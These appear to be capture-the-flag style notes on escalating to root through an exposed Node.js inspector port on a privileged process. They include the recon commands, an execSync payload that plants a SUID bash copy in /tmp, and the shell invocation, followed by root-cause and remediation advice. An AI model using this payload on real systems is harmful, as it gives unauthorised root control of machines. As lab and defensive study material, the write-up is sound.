## Privilege Escalation Notes

## Vulnerability Class

Insecure debug interface exposing arbitrary code execution (RCE) in the context of the process owner.

## Indicators / Recon

- `ss -tunlp` shows a port (commonly `9229`) bound to `127.0.0.1` for `node --inspect`.
- A privileged process (e.g. root cron job, systemd service) is running with `-inspect` enabled.
- Trying to start your own instance on the same port fails (`address already in use`) — confirms another process already holds it.
- Application errors (e.g. `EACCES` writing logs) confirm the *visible* process runs as low-priv user, but the inspector-bound process may be a different, higher-priv instance.

## Exploitation Steps

1. Connect to the exposed inspector:
    
    ```
    node inspect 127.0.0.1:9229
    ```
    
2. Use `exec()` to run shell commands in the context of the privileged process:
    
    ```jsx
    exec("process.mainModule.require('child_process').execSync('cp /bin/bash /tmp/r00t && chmod +s /tmp/r00t')")
    ```
    
    - This creates a SUID copy of bash owned by the privileged user (root).
3. (Ignore `exit is not defined` errors in the REPL — payload already executed; `Uint8Array(0)` = success.)
4. Exit debugger, verify SUID binary:
    
    ```
    ls -la /tmp/r00t-rwsr-sr-x 1 root root ... /tmp/r00t
    ```
    
5. Spawn root shell, preserving privileges:
    
    ```
    /tmp/r00t -p
    ```
    
    - `p` flag prevents bash from dropping the SUID-elevated euid.
6. Confirm root:
    
    ```
    cat /root/root.txt
    ```
    

## Root Cause

- Node `-inspect`/`-inspect-brk` is a full debugging API — anything connected to it can execute arbitrary JS, including `child_process` calls.
- Binding to `127.0.0.1` does NOT mean safe — any local user can connect.

## Remediation

- Never run `-inspect` on production/privileged processes.
- If debugging is required, restrict to non-privileged accounts and use authentication (`-inspect` with `-inspect-port` + firewall/namespace isolation).
- Use `node --inspect=127.0.0.1:PORT` only in dev, never as root/systemd-privileged service.
- Monitor for unexpected SUID binaries in `/tmp` (e.g. via auditd, periodic `find / -perm -4000`).

# Node Inspector Privesc — Quick Recap

- Found port `9229` open on `127.0.0.1` (Node debug inspector) via `ss -tunlp`
- This port belongs to a **privileged process** already running with `-inspect`
- Connecting to inspector = arbitrary JS code execution as that process's user
- Used `exec()` + `child_process.execSync` to copy bash and set SUID bit
- `exit` error in REPL is harmless — payload already ran successfully
- SUID bash binary (`/tmp/r00t`) created, owned by root
- Ran with `p` flag to preserve elevated privileges (don't drop SUID euid)
- Got root shell, read flag

**Key takeaway:** `--inspect` on a privileged process = instant RCE → root, even if bound to localhost only.
